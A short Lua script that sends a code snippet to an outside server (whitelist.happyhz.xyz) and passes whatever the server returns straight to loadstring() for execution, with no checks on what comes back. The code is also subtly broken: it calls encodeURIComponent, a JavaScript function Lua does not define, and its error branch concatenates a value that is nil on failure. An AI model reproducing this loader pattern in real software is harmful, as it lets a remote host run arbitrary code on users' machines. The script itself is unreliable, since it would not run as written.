local http = require("socket.http")
local ltn12 = require("ltn12")

-- Set the URL of the loadscript API endpoint
local url = "http://whitelist.happyhz.xyz:1599/loadscript"

-- Set the Lua code to load and execute
local luaCode = [[
  print("Hello from Lua!")
]]

-- Encode the Lua code as a URL-encoded string
local requestBody = "loadscript=" .. encodeURIComponent(luaCode)

-- Set the request headers
local requestHeaders = {
  ["Content-Type"] = "application/x-www-form-urlencoded",
  ["Content-Length"] = tostring(#requestBody)
}

-- Send the POST request to load the Lua code
local responseBody = {}
local response, responseCode, responseHeaders = http.request({
  url = url,
  method = "POST",
  headers = requestHeaders,
  source = ltn12.source.string(requestBody),
  sink = ltn12.sink.table(responseBody)
})

-- Check for errors and handle them
if responseCode ~= 200 then
  print("Error: " .. response)
  return
end

-- Convert the response table to a string
responseBody = table.concat(responseBody)

-- Execute the loaded Lua code
loadstring(responseBody)()
